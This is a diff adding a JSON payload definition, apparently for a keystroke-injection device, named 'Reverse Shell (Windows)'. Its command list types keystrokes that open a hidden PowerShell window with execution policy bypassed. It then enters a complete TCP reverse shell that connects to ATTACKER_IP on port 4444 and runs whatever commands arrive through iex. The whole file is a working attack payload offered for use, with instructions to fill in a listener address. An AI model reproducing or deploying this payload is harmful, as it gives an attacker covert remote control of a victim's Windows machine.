@@ -1,0 +1,28 @@
+{
+    "name": "Reverse Shell (Windows)",
+    "description": "Opens a reverse shell connection on Windows systems via PowerShell",
+    "target_os": "windows",
+    "delay_ms": 100,
+    "commands": [
+        "REM Reverse shell payload for Windows",
+        "REM Replace IP and PORT with your listener",
+        "DELAY 1000",
+        "GUI r",
+        "DELAY 500",
+        "STRING powershell -NoP -NonI -W Hidden -Exec Bypass",
+        "ENTER",
+        "DELAY 1500",
+        "STRING $client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);",
+        "STRING $stream = $client.GetStream();",
+        "STRING [byte[]]$bytes = 0..65535|%{0};",
+        "STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;",
+        "STRING $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);",
+        "STRING $sendback = (iex $data 2>&1 | Out-String );",
+        "STRING $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';",
+        "STRING $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);",
+        "STRING $stream.Write($sendbyte,0,$sendbyte.Length);",
+        "STRING $stream.Flush()};",
+        "STRING $client.Close()",
+        "ENTER"
+    ]
+}
